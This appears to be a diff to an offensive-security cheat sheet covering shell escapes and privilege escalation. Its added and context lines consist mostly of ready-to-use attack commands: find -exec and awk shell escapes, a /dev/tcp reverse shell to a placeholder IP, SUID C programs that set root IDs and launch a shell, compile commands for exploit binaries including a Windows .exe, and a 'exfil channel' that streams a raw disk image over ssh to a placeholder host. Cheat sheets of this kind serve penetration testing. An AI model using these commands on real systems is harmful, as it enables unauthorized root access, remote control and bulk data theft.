@@ -50,6 +50,13 @@ find /home -exec sh -i \;
 !bash
 ```
 
+## find
+use find command’s exec parameter for code execution (returns shell)
+```
+sudo find /home -exec sh -i \;
+find /var/log -name messages -exec /bin/bash -i \;
+```
+
 ## use awk command
 ```
 awk 'BEGIN {system("/bin/sh")}'
@@ -86,7 +93,6 @@ bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
 ```
 
 # Programming Language:
-
 ## Python:
 ```
 import os; os.system("/bin/sh")
@@ -149,3 +155,42 @@ int main(int argc, char **argv)
 	return 0;
 }
 ```
+```
+int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/bash");
+}
+```
+```
+int main(void){
+       setresuid(0, 0, 0);
+       system("/bin/sh");
+}       
+```
+
+### Building the SUID Shell binary
+```
+gcc -o suid suid.c 
+gcc -o exploit exploit.c
+``` 
+
+### For 32 bit:
+```
+gcc -m32 -o suid suid.c  
+gcc -m32 exploit.c -o exploit
+```
+
+### Compile Windows .exe on Linux
+Build / compile windows exploits on Linux, resulting in a .exe file.
+```
+i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
+```
+
+
+# Encrypted exfil channel:
+```
+dd if=/dev/<disk-to-copy> bs=65536 conv=noerror, sync | ssh -C <user>@<ip-address> "cat > /tmp/image.dd"
+```
+
+
+
